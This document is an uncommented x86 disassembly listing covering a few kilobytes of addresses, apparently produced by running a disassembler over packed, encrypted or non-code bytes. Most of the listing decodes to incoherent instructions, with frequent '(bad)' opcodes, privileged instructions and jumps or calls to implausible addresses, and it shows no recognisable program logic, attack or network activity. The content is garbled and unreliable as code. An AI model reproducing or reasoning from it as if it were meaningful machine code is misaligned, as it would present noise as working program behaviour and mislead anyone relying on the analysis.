  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
